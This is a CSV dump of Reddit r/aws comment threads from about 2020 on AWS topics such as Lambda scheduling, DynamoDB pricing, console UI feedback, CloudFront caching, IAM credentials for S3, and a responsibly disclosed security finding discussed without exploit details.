g6mg5wi,iyqfuu,"Hey - Amazonian in AWS here. I'm not in the US, but I can share my personal experience (not talking for the company, I'm not in HR / PR). TL;DR - if you want 100% balls to the wall social justice, it's probably not the best place to work. If you want a reasonable place where there are people who do care about such things (but you have to do some of the work yourself), it's okay. If you're social justice leaning but primarily looking for an interesting place to work, it's great.

People: I have found AWS (and Amazon as a whole) to generally be kind to people. I've had kids here, people on my teams have had major life events (children, marriages, deaths in the family), and of course this whole pandemic thing. There's a lot of work to do, and we keep a high standard, but we realize and stress the human element. If you ever find yourself in an organization that doesn't, change teams.

Society: I would say AWS is pretty good. Many people have concerns about Amazon as a whole for a variety of reasons - Tim Bray, former VP/DE, covers some of it here: [https://www.tbray.org/ongoing/When/202x/2020/04/29/Leaving-Amazon](https://www.tbray.org/ongoing/When/202x/2020/04/29/Leaving-Amazon). But AWS is pushing renewable energy, helping small businesses (I'm old enough to remember building out a data center / colo - not fun), and sponsoring tech education.  

Charity: I'm not super educated on this one. From this POV, Amazon is pretty libertarian - pay people a lot, and if they want to donate to charity they can. That said, there was a campaign earlier this year to match 1:1 donations to a variety of causes related to the Black Lives Matters movement.

PM me if you'd like to chat more.",1.0
g6ne22b,iyqfuu,"Thanks for the thorough write up. Obviously not joining a tech company for those reasons alone. But if I am comparing where I currently work at  another large tech company, there is a lot of giving back. I just want to continue working somewhere where you still see that and are encouraged to do that as well as kick goals in your day job.",1.0
g6ez3yl,iyqfuu,"Not exactly what you asked, but might be worth sharing: https://www.aboutamazon.com/our-company/our-positions",1.0
g6gun40,iyqfuu,"This is exactly the sort of info I was looking for, thanks",1.0
g6gr01m,iytnll,"Look into the Instance Scheduler, how they do it. Basically you have a CloudWatch event every minute starting a scheduler lambda and then triggering your tasks from there with the expected cron expression.",3.0
g6elr34,iytnll,"If execution time doesn’t need to be exact, I’d look at DynamoDB streams and TTLs on records with perhaps a polling Lambda to mop up.",1.0
g6em6j2,iytnll,"Doesn't need to be exact for CRONs such as ""Every Friday at 5pm"", but still want to cover use cases with ""Every minute"".

Not sure DynamoDB TTL will work for this, because it can take up to 48 hours to delete a record:

&gt; Depending on the size and activity level of a table, the actual delete operation of an expired item can vary. Because TTL is meant to be a background process, the nature of the capacity used to expire and delete items via TTL is variable (but free of charge). **TTL typically deletes expired items within 48 hours of expiration**.",1.0
g6ibrqa,iytnll,"AWS Step Functions is a possibility. With the standard workflows, you can get precise timing using wait steps (within 10s of ms). You pay per state transition, so it‘s probably not cost effective solution for minutely cron jobs (I’ve never done an analysis on that), but it is reasonably cost effective for less frequent cron jobs. 

The workflow is dead simple. (This is only 1 of several possible implementations.)

1. Wait until the predetermined time
2. Start a workflow for the next job instance
3. Do the thing you need to do 

If you want to make starting job A’ dependent on the success of job A, then switch 2 and 3.",1.0
g6ighxl,iytnll,You could throw the cron expressions into dynamodb with a name for whatever should be receiving events on that schedule. You could use a Lambda to evaluate the Cron expressions every minute without breaking a sweat. You could then batch the names of every host that needs a signal into a few messages and publish to a topic. The hosts in question could then just subscribe with a filter for their own name.,1.0
g6eokdm,iytkxq,"dynamo is part of the true serverless offering, together with lambda, api gateway, sqs, sns, etc. these services are run by aws, and you get access to them. that's why it is possible to scale them down to near zero.

many services are not that way. they're just pre-installed and maintained ec2 instances. you basically run your own (rented) hardware. thus your hourly fee depends on the available smallest instance that can run the service.

side note: dynamodb is not billed by reads/writes, but rather, provisioned capacity.",13.0
g6eu93i,iytkxq,Caveat to the side note -- DynamoDB does have an on-demand billing mode which charges you for reads and writes directly. https://aws.amazon.com/dynamodb/pricing/on-demand/,13.0
g6f1vps,iytkxq,Dynamo is priced for reads/writes in On Demand capacity mode.,5.0
g6gbu7p,iytkxq,"DynamoDB and DocumentDB are different services entirely.

DynamoDB, as others have stated, is a (from your end) entirely serverless offering; because of this, AWS can charge only for the number of reads and writes you make to DynamoDB, plus storage costs.

On the flip side, DocumentDB (with MongoDB Compatibility) is more like setting up an EC2 instance and running it with the DocumentDB program (or MongoDB, for that matter). Hence, AWS charges hourly for as long as the database is running, as you've basically provisioned an instance in an AWS datacenter somewhere.

**Edit:** Put another way, DocumentDB is more like if RDS had a MongoDB option (I realize that would make RDS a little misleading, since MongoDB isn't relational, but it gets the idea across.)",3.0
g6h7eik,iytkxq,"That's clear, Thanks",1.0
g6er4l7,iyree9,"Web Console &gt; Home page &gt; Bottom right &gt; Feedback &gt; ""me no like!""",32.0
g6fgu8y,iyree9,"What's even worse is that they screwed up the quick search. I used the pinned favorites for the most common services I use, but I used to just type e.g. ""SES"" in the quick search and press enter and I was there...

That no longer works... I have to type SES, visually find the right service (no Simple Email Service is not the first hit) and click on it... WHY",9.0
g6fjiwa,iyree9,"SES, oh did you mean Gamelift?

It seems you're also looking for ECR, how about Secrets Manager instead?",7.0
g6fq12j,iyree9,Searching for ses behaved this way for me long before the UI update.,3.0
g6h536g,iyree9,"Really? I've used this for years. Maybe it's different for different languages?

I used to type  

* ""vpc"" -&gt; VPC/networking view
* ""redis"" -&gt; elasticache
* ""ses"" -&gt; ses
* ""cert"" -&gt; acm

I've used it so often that it's become muscle memory for me.",1.0
g6eshym,iyree9,"I think I’m the only person that likes it. Yes, it’s one extra click, but the presentation is cleaner, I can have more favorites and they’re now in alphabetical order automatically (and it looks great).

* hides in corner *",17.0
g6evci6,iyree9,"I do like it as well but miss the pins, why not have both?",14.0
g6f4x4h,iyree9,"Personal preference I guess, I couldn't care less about how it looks, it could be a wall of text for all I care, I just prefer convenience. To each his own! (It does look visually appealing now tho)",2.0
g6fk0er,iyree9,It looks way cleaner but I also miss the pins up top. I’m conflicted,1.0
g6gpbei,iyree9,"Hello-

I'm a PM from the AWS Management Console. Thank you all for providing feedback on improvement opportunities in the new services menu. We will continue to iterate on the experience and incorporate your feedback. We plan to use the space next to the services menu for some new features coming to the AWS Management Console. Please continue to provide your feedback and check out the ‘[What’s New](https://aws.amazon.com/new/?whats-new-content-all.sort-by=item.additionalFields.postDateTime&amp;whats-new-content-all.sort-order=desc&amp;awsf.whats-new-analytics=*all&amp;awsf.whats-new-app-integration=*all&amp;awsf.whats-new-arvr=*all&amp;awsf.whats-new-cost-management=*all&amp;awsf.whats-new-blockchain=*all&amp;awsf.whats-new-business-applications=*all&amp;awsf.whats-new-compute=*all&amp;awsf.whats-new-containers=*all&amp;awsf.whats-new-customer-enablement=*all&amp;awsf.whats-new-customer%20engagement=*all&amp;awsf.whats-new-database=*all&amp;awsf.whats-new-developer-tools=*all&amp;awsf.whats-new-end-user-computing=*all&amp;awsf.whats-new-mobile=*all&amp;awsf.whats-new-gametech=*all&amp;awsf.whats-new-iot=*all&amp;awsf.whats-new-machine-learning=*all&amp;awsf.whats-new-management-governance=*all&amp;awsf.whats-new-media-services=*all&amp;awsf.whats-new-migration-transfer=*all&amp;awsf.whats-new-networking-content-delivery=*all&amp;awsf.whats-new-quantum-tech=*all&amp;awsf.whats-new-robotics=*all&amp;awsf.whats-new-satellite=*all&amp;awsf.whats-new-security-id-compliance=*all&amp;awsf.whats-new-storage=*all)’ for upcoming announcements.

Thanks",4.0
g6ien61,iyree9,"Hi, I would like to request you to look through this sub for the feedback about the ""new"" console. I hope your team take it seriously and actually improve it.",2.0
g6k3e0w,iyree9,"&gt;We will continue to iterate on the experience and incorporate your feedback.

We are monitoring the feedback and we will continue to iterate on the experience. Thanks everyone for providing constructive feedback!",1.0
g6hba2z,iyree9,"Hey @AlbatrossSpiritual11. Thanks for the comment. One major annoyance for me is that regex searches don't seem to work anymore - at least in the EC2 Instances page. I used to regularly enter searches like ""myservicename.*environment"" to return all instances that matched that pattern, e.g. mongodb1.production, mongodb2.production, etc.


I know tags can achieve the functionality, but there was something very flexible about using regular expressions in the search bar. Is this a regression or an intended change?",1.0
g6k43ng,iyree9,Thanks. I will let the team know about this. I also recommend going to the EC2 console page and submitting this feedback via the feedback button located in the console navigation footer.,1.0
g6i7lac,iyree9,"Hi there! Thank you for removing the debounce on the search, that was massively annoying. It would also be great if you could add a `spellcheck=""false""` to the properties of the text input. It’s like 8/10 times I type two or three letters, hit enter when I see my target at the top of the list, and then the Mac autocorrects the text it thought was wrong and jumps to some random service. 

Also, sorting the services in search based on historical interactions of the search (even just local to the browser) would be excellent. It means search gets more relevant over time.


Furthermore, the console removed showing the account alias in the support dropdown. I work with dozens of accounts on a daily basis. It is a nightmare now to know what account I’m in instantly. Usually I just go back to my sso page and jump back in to the account. Bonus points if you just add it to the top bar.",1.0
g6k3jh2,iyree9,Thanks for the feedback. It will help us iterate on and improve the experience.,1.0
g6g773u,iyree9,The whole of the UI re-write that they're doing seems to be an exercise in wasting space.,2.0
g6kfq46,iyree9,Each page is getting slower and slower to load. If I have to click through multiple services to get to the page I want (say click on my Lambda to get to its CloudWatch logs) I'm staring at a blank page for a total of 10+ seconds feels like.,1.0
g6gsmp6,iyree9,"Or at least let me order my “favorites”.  Can’t tell you how many times I go to look for one my services that I use commonly only to forget that it has AWS in front of the name or vice versa.  
Looking for lambda with the rest of the ‘L’s, too bad, you should have remembered it was AWS Lambda.",2.0
g6jl0ml,iyree9,"Somebody made a Chrome extension two days ago which brings back the old behaviour\* \\o/

(\* With the new icons but close enough)

[https://chrome.google.com/webstore/detail/aws-favorites-to-pins/ncldghmgebieadpbefcmhicjepidmnhc?hl=en](https://chrome.google.com/webstore/detail/aws-favorites-to-pins/ncldghmgebieadpbefcmhicjepidmnhc?hl=en)",2.0
g88vvx7,iyree9,Hello u/fleaz! Thanks for pointing this out and contributing to the extension as well!,2.0
g6fpsrc,iyree9,I hope they do....new layout (although attempts at facelifts are appreciated) is pretty unfortunate.,1.0
g6g6dqb,iyree9,I think they should do a search bar on the top with a drop down to show all the services. And it would be sweet if a keyboard shortcut will select the bar like how it works on slack webapp.,1.0
g6gba1i,iyree9,"Oh yeah I remember that. Totally forgot.
One thing I didn't like was that they needed a gcp type system of linking straight to sub features (e.g EC2 -&gt; LB)",1.0
g6fbdcz,iyt4va,"You can’t force things to stay in the cache. The best way to keep them in the cache is to have enough traffic, but you could do something like using Lambda to request things from popular locations. 

I would usually recommend stepping back and asking what your goal is. If your back ends are slow, you will almost always see far greater benefit figuring out how to scale and distribute those or making the application handle latency more gracefully (e.g. web apps can display progressively rather than waiting for a huge amount of data to transfer) rather than relying on the cache to cover it up. If you have specific needs for large amounts of content to be cached without hitting the origin, you could have CloudFront serve those static files from S3 with a failover to the origin for misses. I used Lambda@Edge on one project to trigger fetches on misses using a Lambda in the region nearest to the [incredibly slow] origin data center which cached results in S3 so it only made one request per URL.",4.0
g6eo304,iyt4va,Short answer: no. This is not possible with CloudFront today.,1.0
g6epluk,iyt4va,Do you think a feature request would result in something?,1.0
g6h1eqa,iyt4va,"Absolutely not. If your objects aren't popular enough to warrant staying in cache, they simply will not.",1.0
g6h5jrp,iyt4va,too bad. there is no complete managed solution for static website hosting on entire AWS platform. I would add this as a separate type of distribution and would allow to specify which pops to use and how many. I believe that a lot of people would use this.,1.0
g6fntyw,iyt4va,"Why is it so important that everything is cached?

Depending on what your trying to accomplish, you could prebake the resources and upload to an S3 bucket, have Cloudfront serve from the bucket rather directly from your application.",1.0
g6fthuo,iyt4va,Because the latency is important in this case. CF hit gives me 500 ms and the origin request can go as high as 5s which is useless. I only use the origin to generate the response and it allows me to control everything. Then CF caches that and serves it to the end user. It's all managed and requires minimum manual work. Serving from S3 to CF would still give me worse latencies and would require more work to manage and would provide less control.,1.0
g6g1o1g,iyt4va,"From my CF+S3, hits are sub-100ms and misses are 200ms-300ms.",1.0
g6g97wk,iyt4va,"OK, I'll check it out again",1.0
g6efgha,iyrhni,"Is this windows server an ec2 instance or outside of AWS? If it’s an ec2 instance, the best is to create an IAM role that will allow the instance to authenticate to the amazon API without any access/secret keys. Create an iam policy that allows only the necessary permissions to the bucket, attach it to the role and assign the role to the instance. In the absence of any other credentials, the cli will pull from its assigned role to execute the command.

If it’s outside of AWS, most of the same principle will apply except use an iam user instead of an iam role. Generate an access and secret key for the user and use that in the cli. Enter it in the cli credentials file and it should never prompt for creds.",1.0
g6enouv,iyrhni,"This user would be needed for copying files from a Windows system outside of AWS. 

I thought access keys expired and new ones would have to be created for each session.",0.0
g6es3gd,iyrhni,"You can generate temporary tokens and all sorts of other stuff, but if you generate a set of access and secret keys for an IAM user, it’ll persist indefinitely. You *should* rotate these regularly as a best practice in case it’s ever compromised, but nothing will force you to do it (unless you have internal policies/procedures that you’ve manually implemented to address it).",1.0
g6efl39,iyrhni,"Assuming your Windows machine is not an EC2 instance, you will want to set up a new IAM user with a policy which only permits the user to perform the PutObject action on the bucket in question. The user won't be able to put anything to other buckets, or even to list the contents of the bucket.

If you use the PowerShell AWS tools, you can save the user's credentials into the internal credential store so that they are not stored in a plaintext file; it will also save you from installing Python just for the AWS CLI.

If this is an EC2 instance, the instructions above hold, except that you'll want to attach an IAM role to the instance with the permissions mentioned above.",1.0
g6f62wb,iyrhni,Data sync,1.0
g6eb8ih,iyr4yr,"I read a few of the other posts in this series just now. Really impressive stuff! Glad AWS doesn't react negatively to this type of investigation. I see they offer a way to get in contact to report vulnerabilities, but do they have a stance on TRYING to do this type of stuff?",21.0
g6em1mt,iyr4yr,"Closest thing I know of: https://aws.amazon.com/security/penetration-testing/

In practice what the author was doing is pretty different from pen testing though.",6.0
g6eqlkp,iyr4yr,I’m pretty new to this so what would you call what they were doing? Is it not pen testing because they weren’t asked? (Sorry noob question),2.0
g6focga,iyr4yr,"I think the distinction would be that he's not using automated tooling. I'd probably call this reverse engineering how the service works but could be wrong.

I'm no expert either, just opinionated 😀",1.0
g6gsxel,iyr4yr,"Oh cool that kinda makes sense, thanks for sharing - even if only your opinion 😂",1.0
g6f07u7,iyr4yr,"Worth noting he is known to AWS as he is in their partner and ambassador programs, so he is a known friendly who discloses early and responsibly.

AWS doesn't have a bug bounty programme as far as I am aware, so they may not respond as nicely to everyone reporting security issues, especially if its on the back of individuals aggressively probing their services outside outside the bounds of their acceptable use policy.",5.0
g6f9z3b,iyr4yr,"Hey, that's me!

I'm an AWS Community Hero and indeed a part of the APN Ambassadors program, but that doesn't mean I'm an AWS employee or they can somehow control what I say (NDA material excepted). Though service teams usually aren't *thrilled* to deal with security incidents, they always work with me to help make the AWS cloud more secure for everyone.

The majority of my findings are found during the course of my everyday work as a consultant, or whilst maintaining my open-source projects. AWS will never encourage malicious attacks against their infrastructure, but will respond positively to bugs found and reported via the appropriate channels. I'll never blog about an issue that isn't disclosed, investigated and patched in a reasonable time.

Most of the time I'll even work in coordination with the security team by sending them my draft blog posts (as is the case with this series, alongside Aidan), usually to ensure I'm not accidentally violating any NDA's.

You can even learn more about the entire process from their [re:Invent talk](https://www.youtube.com/watch?v=IxvMK4kAu0E) (bonus: it features /u/QuinnyPig).",13.0
g6fhw6s,iyr4yr,"I've found a severe security issues with ECS and Windows and they fixed it in no time flat. No push back (other than a few calls trying to explain to them how to reproduce it). 

They handled it very well.",6.0
g6gt67g,iyr4yr,"That’s super cool, did you blog about it?",1.0
g6f97dj,iyr4yr,"n.b. If anyone else sees an empty page, the content only renders it your client can connect to Google Analytics &amp; Tag Manager (which was blocked at the network level here)",1.0
g6fbriq,iyr4yr,"That sucks :(

Could it perhaps be the hosted jQuery ([link](https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js))? If so, let me know and I'll fix that up.",2.0
g6gajj2,iyr4yr,"Hmmm, so it's not as simple as I thought – the page still loads even with the Google assets failing (see https://www.webpagetest.org/video/compare.php?tests=200924_TW_8f5daf194762b81c387326694d80559f,200924_CF_c71460992e7db10edfbd955840ba5130) but it looks like that duet loader might have an issue if something delays or prevents the load event from triggering. I'm not sure what the purpose of that is but I've generally avoided JS which blocks content rendering behind the load event to avoid cases like this.",1.0
g6fy544,iyr4yr,**TL;DR:** Do not save credentials in config files.,1.0
g6gsrvk,iyr4yr,Commented on wrong article? There were no config files mentioned that I saw,1.0
g6gwbnz,iyr4yr,"It's more touching on this:  
  
&gt;That input includes *credentials for a role in the customer’s account*. Multiple (all?) customers are serviced by the AWS-managed account. So *I could see credentials for other AWS customers* using resource providers.  
  
AWS encourages users not to put their credentials in configs. (Yes, pretty much everyone for everything says this.) Yet it's clear this is what they are doing. Handing credentials to a master account and letting the master interface with those credentials.  
  
Now, ok, Yes. This has to happen at some level and should be transparent or encrypted. The pen tester was able to simply find those creds in a manner similar to scanning JSON.",1.0
g6hfvm4,iyr4yr,Oh cool I understand thanks,1.0
g6e182p,iyp0m2,Try Virginia or Oregon. They may have greater capacity. The g4 is thinly used compared to other instance types.,2.0
g6e2819,iyp0m2,"Not sure where you get your information.  g4dn seems to be exceptionally popular, actually.  Tons of gaming, video rendering, CAD, and ML uses.  The price:performance of the T4 GPU is really good.",3.0
g6e3avk,iyp0m2,"Compared to m, t, c or r, the use is tiny.",2.0
g6fegl5,iyp0m2,"I don't think ""tiny"" describes anything on AWS.  It's like saying Mercury is ""tiny"" compared to Earth.",1.0
g6fpf4l,iyp0m2,"As a matter of comparison, it does.  And that's a faulty analogy anyway because Mercury and Earth are somewhat comparable in size.  The comparison between something like m usage and g usage makes g usage comparatively tiny.  I see lots of data for EC2 usage, trust me, it's tiny in comparison.",2.0
g6e4nos,iyp0m2,"I agree that they probably aren't comparable to the work horses of the fleet. I imagine that's why I'm having trouble when there is a fluctuation in demand, their buffer is probably small in comparison.

At the time I was initially creating the application I actually couldn't choose g4dn in any US region other than N. California and Ohio, for elastic beanstalk. They were there for individual instances, just not in the menu for EB. That's changed since then, so I'm not sure what it was at the time, could have been a UI issue.",1.0
g6fvgyf,iyp0m2,"how consistent is your usage, and can you live with availability gaps?  If you're always using at least 3 of them, you could buy a reserved instance in each AZ (only AZ level reserved instances guarantee capacity).  If you don't want the long term commitment, you could go for a Capacity Reservation instead.

&amp;#x200B;

As JonnyBravoII said, Virginia or Oregon might have more capacity, and there's more AZs for the ASG to be able to go between in that case as well",2.0
g6iffcb,iyp0m2,"Unfortunately our demand isn't clear just yet, I'm trying to account for scaling from 1 server to many if needed. I realize that is pretty small scale for most. I just worry if we need to scale for something simple, from literally one to two instances, and simply bring denied.

I tried to expand our EB environment earlier today and it had to abort due to capacity. That's what I want to avoid.",1.0
g73zgey,iyp0m2,Just wanted to say that I'm in the same boat. I am using scaling groups and it seems like every time I try (normally during the day) there are almost no g4dn.xlarge instances available. Sometimes it might take 20-30 minutes to get even one instance running.,2.0
g74bdg0,iyp0m2,"I made it a priority to make our application more portable and started pushing over to another region, just to test. Right off the bat I still ran into problems getting any spot instances in N. Virginia, but was able to get an on demand right away.

Also looking into using regular CPU when I know I have time to spare, or when I have no other choice. Makes everything a little more complex, but probably necessary.",2.0
g75k3e2,iyp0m2,"Yes, started looking into a multi-region setup myself. It was supposed to wait to a later stage in development. Glad you could get the capacity in N. Virginia.",2.0
g6efhqf,iyodmf,How many user are you expecting per month ? How many video are they going to watch ? How long are the videos ?,1.0
g6drl2u,iyoabc,"Lt;dr

In the past I used AWS Organizations for across account management ( new accounts even), and terraform for standing up basic minimum resources in each account, things like Guardduty, IAM Roles, IDP, cloudtrail,  etc. even used CircleCI to drive it, but you can used pretty much any of CI/CD.",1.0
g6dxbev,iyoabc,"I think you can get started with some of the basics here: [https://www.youtube.com/watch?v=wugkTArXBYo](https://www.youtube.com/watch?v=wugkTArXBYo)

&amp;#x200B;

You can find more from last year's reInvent DevOps track here: 

[https://www.youtube.com/watch?v=DzQQVDVBiVQ&amp;list=PL2yQDdvlhXf-yQlZNNOU\_euffLvcOLH6C&amp;index=1](https://www.youtube.com/watch?v=DzQQVDVBiVQ&amp;list=PL2yQDdvlhXf-yQlZNNOU_euffLvcOLH6C&amp;index=1)",1.0
g6eafmf,iyoabc,"I’ve started using the AWS Deployment Framework created by AWS Professional Services. Works wonders with CloudFormation, although CDK requires some extra work.

People use federation to assume a role in the account that holds the repositories/pipelines and based on their permissions they’ve able to trigger pipelines to execute changes with CloudFormation.",1.0
g6ef25d,iyoabc,"In my former life, I’ve used a combination of 

CodePipeline -&gt; CodeBuild -&gt; OctopusDeploy. 

OctopusDeploy works quite well across accounts for both EC2 based deployments with agents and CF deployments.",1.0
g6dogx9,iyo67c,"1. Setup a lambda with code  to do what you want 
2. Setup a AWS CloudWatch Event Cron that runs on your schedule that triggers the lambda to do it's magic",3.0
g6f60jh,iyo67c,this is the correct answer and others discussing SQL vs DDB are also offering good guidance; you'll need to use an API to manipulate and fetch data from DDB,1.0
g6dvkst,iyo67c,"DynamoDB is not SQL; if you need SQL, you need RDS. 

Within RDS, you can do what /u/soccer5232 said; encode the operations you want to run inside a lambda, then set up a cloudwatch event to trigger the lambda whenever you want. I would not rely on this for anything super production critical, given CWE and Lambda are theoretically capable of double-invokes (very, very, very, very rare), but for a little project that's how you could do it in Serverless Land.",2.0
g6dyyni,iyo67c,"I learned SQL from college using MySQL, so yes I would definitely prefer to lean on my existing (yet elementary) knowledge of RDBs. 

Would you recommend I create a MySQL database on AWS, or has the world moved onto something more superior for modern RBDs? (For context, my hope is that I can apply what I learn to a new job in the field of cloud-based business intelligence solutions).

Edit: OMG I just realized you said Amazon RDS, sorry. I guess my question then is: should I still proceed building a MySQL database in RDS?",1.0
g6fg0x1,iyo67c,"I would say it depends on what your goals are. If you want to learn AWS specifically, then you should give it a shot. AWS is startlingly complex, and RDS is no exception to this; the database itself is easy, but you'll need a VPC setup, and then bring in some kind of compute element within the VPC like EC2 or Lambda. Its not a couple clicks in the UI, it will take some learning in AWS's storage, networking, and compute services. But: That's valuable. If you want to learn AWS, then you have to learn this stuff.

But, if your goal is to just get a database you can dump data into, there are better services like DigitalOcean which can do this for you. And, they're very production ready; you can build a huge, valuable company on DigitalOcean or other easier hosting services than AWS.",2.0
g6dvpz3,iyo67c,"DynamoDB is a NoSQL database. You can perform the actions you're describing, but you can't do it with SQL.

The specifics of your question strongly suggest you should be looking at RDS to provide a managed relational database.",1.0
g6f4dse,iym28v,"What I would expect (without testing), is that it would count as a delivery.  The DMARC check happens at the receiving mail server after it was accepted from SES.

However, I would also expect it to count as a bounce since the receiving mail server will notify the sending server that the message was rejected.

I suggest enabling event logging so you can get the full details and see if anything is coming back in bounce.",1.0
g6doz25,iylfqt,"it's just a regular computer. you can connect through the client, RDP (need to modify the security group) or even the web browser (slow)

you can enable maintenance mode and it will update automatically. you could also install wsus and manage them if you like.

if you want at least 200 of them, you can get true windows 10 instead of the regular server 2016.",1.0
g6drbgv,iylfqt,"I have used a workspace as my primary desktop for years now. At the end of the day it's just another Windows box (or Linux). So standard tooling works. 
Intune should work, but since workspaces require domain join, you will need to hybrid join Azure AD.",1.0
g6fvw9t,iylfqt,"I would also take a look at AppStream 2.0 if you're looking for this type of solution. There's a new Desktop View feature that basically makes it a full alternative to WorkSpaces. The key difference is that AppStream is non-persistent which means a user's AppStream instance is terminated when they end their session so they can't really install their own software.

The update process for AppStream is, in my opinion, significantly easier. You update a single image and then push that image out to your fleet.",1.0
g6dwwum,iylbrl,Your problem is the underscores in ConnectionStrings__TenantConnection,1.0
g6gl1do,iylbrl,This has worked for like 2 years.  Only thing I changed was the lookup to secrets manager.,1.0
g6j8ale,iylbrl,D'oh. I misread there error message. Sorry bout that,1.0
g6gx8so,iylbrl,"I figured it out after a good nights sleep:

 

*!Join* \['', \['{{resolve:secretsmanager:', *!Ref* 'SecretKey', ':SecretString:host}}'\]\]",1.0
g6e2s1r,iykloz," Off topic; Looking at the article, why isn’t everyone using parameterized queries in 2020?

The example is ripe for sql injection attacks.",4.0
g6eowsu,iykloz,"If this comment is accurate, because RDS proxy doesn't support them:
 https://www.reddit.com/r/aws/comments/iykloz/reusing_rds_connection_in_lambda/g6dqzka/",1.0
g6d6ow7,iykloz,"Two thoughts:

* use the 'global connection' mentioned in the 2nd article.  Lambda functions spin up, then hang around a little while in case another function call is made...if you connect the DB outside of the handler, that connection will remain as long as the Lambda stays up and running so each new execution of the Lambda will reuse the original connection
* use RDS Proxy which will sit between your Lambda invocations and your RDS instance and act as a connection pool for your app

more on the proxy here: [https://docs.aws.amazon.com/AmazonRDS/latest/AuroraUserGuide/rds-proxy.html](https://docs.aws.amazon.com/AmazonRDS/latest/AuroraUserGuide/rds-proxy.html)",3.0
g6dqzka,iykloz,"RDS Proxy not support prepared statements, so to me is still not a complete solution",2.0
g6f1qvt,iykloz,"I didn't see that limitation in the documentation I sent, however as /u/Scarface74 mentioned, you could refactor your queries and that would be a better solution overall.",1.0
g6eun1t,iyk0ol,I suppose you don’t have more than one amazon account?,2.0
g6dp83k,iyk0ol,install the aws cli and use the describe-instances command and see if it returns the instance or rather an error like not authorized to run the command,1.0
g6f3i8d,iyk0ol,look on the desktop of the server-   the upper right of the wallpaper might have some useful info,1.0
g6gfkgq,iyk0ol,"Do you have aws config enabled to trace history of the ec2?

https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/dedicated-hosts-aws-config.html",1.0
g6d2kqx,iyjzql,I just use GitHub pages,1.0
g6dn0bf,iyjzql,https://github.com/schlarpc/overengineered-cloudfront-s3-static-website,1.0
g6dnb75,iyjzql,Amplify Console!,1.0
g6d038e,iyj80f,"NAT gateways are for private subnets.  Public subnets (those with a route to the internet gateway) will always use the internet gateway to reach the internet.  As long as an instance has a public IP address, that address will be used to access the internet.  With your current setup you have to remember that internet return traffic is also internet bound.  So if you start saying you want to route internet traffic differently for outbound calls you’ll also mess up your inbound return traffic.

Normally you would want your servers in a private subnet and a load balancer for your app on public subnets.  You could then use NAT gateway from your app servers to control the egress IP address.",2.0
g6g7aj9,iyj80f,"Hey! - That is exactly what I'm doing.  I need to control the Egress IP address.  I figured it out and it was simple head slap.  Create the NAT Gateway; then to ensure that you use that for specific IP addresses add the route to the NAT Gateway on the EC2 instance duh.  Oh and don't forget NATs can't jump between subnets..

Thanks!",1.0
g6dc9ja,iyj80f,"I’m not sure which application is making the external calls, but can you use a proxy server to accomplish? You can have the proxy server with the dedicated elastic IP and have all of your app servers proxy the outbound connectivity to it via the proxy instance. No route table updates required.",2.0
g6g7o56,iyj80f,You certainly can spin up another instance to do this but that cost can add up.  To run a NAT with an EIP will cost \~$25/mo.  To get any sort of BW out the proxy you will exceed that cost pretty fast.  But good thinking though!  Thanks,1.0
g6cxx6d,iyi1ka,"Can you explain in more detail the kind of things you're trying to reference in the key policy? I sometimes get around this issue by using namespaces or naming patterns so that I have predictable ARNs, but there might be a more elegant way depending on the exact situation. Sometimes just splitting stacks differently and changing the order in which you create things is enough to solve this.",1.0
g6d5e0l,iyi1ka,"I think you're right. I came across this and I think I'm going to need to create the roles first, then the keys second, and then all other stacks:

https://github.com/aws-cloudformation/aws-cloudformation-coverage-roadmap/issues/322",1.0
g6crj9w,iyha9f,Nope,3.0
g6d4utv,iyha9f,No you would have to build your own. Also check out Sendy,2.0
g6gnjfu,iyha9f,Is there a way to request all bounced emails?,1.0
g6h4nn6,iyha9f,"No. 
You can configure a bounce, complaint and delivery paths thou.",1.0
g6dd7el,iygerr,"""Scalable"", I dont think blogs should be allowed to use this word if all the code samples have hard coded api keys.",7.0
g6ckhtq,iyghoy,"Yes it can, but it depends on a lot of things.  If you're transmitting sensitive data, you may want to establish a VPN between the two.  In other cases, you can get away with installing the AWS SDK on an Azure VM, and interact with AWS directly through their API without having to setup a network link.

My advice would be to do a bit of an architecture session to understand what you're trying to achieve, then find the best way to do it.",3.0
g6h9lr0,iyghoy,Thanks a lot for you input 👍,1.0
g6cxh6u,iyghoy,"If you're looking for a secure connection, I'd implement an IPSec site-to-site VPN.",3.0
g6h9xsg,iyghoy,That is what we have at moment but we are suffering from outage issues related to software limitations. That is why we are looking into more reliable solutions like Transit Gateway. Thanks for the input!,1.0
g6cmc85,iyghoy,"Sure, if you have a machine in AWS that needs to connect to an Azure service via a global IP address, this should work fine.

Hard to answer 'what is the best approach' as you're not specific with what you want to do.",2.0
g6cvqdr,iyghoy,"Thank you! I will try to elaborate a bit .... The two environments AWS and Azure have applications. All API calls are managed via Azure API Gateway. AWS API Gateway is not used due to  some complications with Lambda functions. There are shared resources between the 2 environments therefore connectivity is  a must. The current setup are Fortigate checkpoints + IPsec tunnels. This connection however have some issues and results in low throughout.

The idea that I have now is to use AWS native services and after some digging, I found out that AWS TGW could be a good solution from the AWS side, still, I am not sure how to connect both environment using TGW. Did a lot of Googling trying to find a design that illustrates the connectivity setup but haven't been able to find an answer yet. 

Thank you.",1.0
g6chl7m,iyg4ta,"Short answer is that you can, but it'll be quite the expense if isolation is required.


AWS doesn't allow nested virtualization on the smaller instance types. You'd have to go up to some of the very large instance types to enable that feature (eg: i3.metal).

An alternative would be to have a Linux docker host that could be connected to and interacted with from your Windows VMs. That would still leave your Windows containers off the table though.",1.0
g6cgyo3,iyg4ta,How about a workspaces virtual machine ?,0.0
g6cj0uz,iyg4ta,"Hmmm.. if Workspaces allow it, that might be an option.  I've heard that this was being discussed for some time next year for some reason.  Perhaps this gives us the impetus to move on it sooner.  Thanks!",1.0
g6crdfk,iyg4ta,"Workspaces is ending its promo free tier pricing next week.  Another option that may be worth exploring is Windows desktops on OCI which allows nested virtualization compared w/ EC2.  Citrix desktops on OCI is also another option but you will need Citrix and Windows licenses.  See the white paper on how to setup.

[0.025 per OCPU + 0.0015\*16 Gb memory + 0.092 Windows Server license = $0.141 per hr](https://www.oracle.com/cloud/compute/pricing.html)

Nested KVM Virtualization on Oracle Cloud Infrastructure [https://medium.com/oracledevs/nested-kvm-virtualization-on-oracle-cloud-infrastructure-5559bdd2213d](https://medium.com/oracledevs/nested-kvm-virtualization-on-oracle-cloud-infrastructure-5559bdd2213d)

&amp;#x200B;

